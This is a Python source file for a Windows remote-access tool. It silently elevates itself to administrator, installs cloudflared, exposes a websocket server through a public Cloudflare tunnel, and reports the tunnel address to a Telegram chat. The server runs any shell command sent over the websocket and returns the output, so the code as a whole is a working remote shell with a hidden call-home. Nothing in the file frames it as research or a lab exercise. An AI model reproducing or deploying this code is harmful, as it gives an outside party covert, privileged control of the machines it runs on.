from re import search
from ctypes import windll
from os import getcwd, chdir
from websockets import serve
from asyncio import Future, to_thread
from sys import executable, argv, exit
from subprocess import Popen, PIPE, STDOUT, run

from src.config import Config

class Server(Config):
    def __init__(self):
        super().__init__()

    def ensure_cloudflared(self):
        check = run("cloudflared --version", shell=True, capture_output=True, text=True)

        if check.returncode == 0:
            return True

        print("cloudflared not found. Installing via winget...")
        install = run(
            "winget install Cloudflare.Cloudflared",
            shell=True
        )

        return install.returncode == 0

    async def listener(self, websocket):
        async for command in websocket:
            command = command.strip()

            if command.startswith("cd"):
                path = command[2:].strip()
                if not path:
                    await websocket.send(getcwd())
                    continue
                try:
                    chdir(path)
                    await websocket.send(getcwd())
                except Exception as e:
                    await websocket.send(f"cd error: {e}")
                continue

            output = await to_thread(
                lambda c: run(
                    c,
                    shell=True,
                    capture_output=True,
                    text=True,
                    cwd=getcwd(),
                    encoding="utf-8",
                    errors="ignore"
                ).stdout,
                command
            )

            await websocket.send(output or "")

    def create_tunnel(self):
        print("Initializing the tunnel...")
        process = Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{self.port}"],
            stdout=PIPE,
            stderr=STDOUT,
            text=True,
            encoding="utf-8",
            errors="ignore",
            bufsize=1
        )

        for row in iter(process.stdout.readline, ""):
            match = search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", row)
            if match:
                self.url = match.group(0).replace("https://", "wss://")
                return self.url

        return None

    async def run(self):
        if not windll.shell32.IsUserAnAdmin():
            windll.shell32.ShellExecuteW(
                None,
                "runas",
                executable,
                " ".join(argv),
                None, 0
                #int("--silent" not in argv)
            )
            exit()

        # Проверяем cloudflared
        if not self.ensure_cloudflared():
            print("Failed to install cloudflared.")
            exit()

        # Создаём туннель
        if self.create_tunnel():
            print("Tunnel:", self.url)

            await self.bot.send_message(self.chat_id, self.url)
            await self.bot.session.close()

            print(f"The message was sent to ID: {self.chat_id}")

            async with serve(self.listener, self.host, self.port):
                await Future()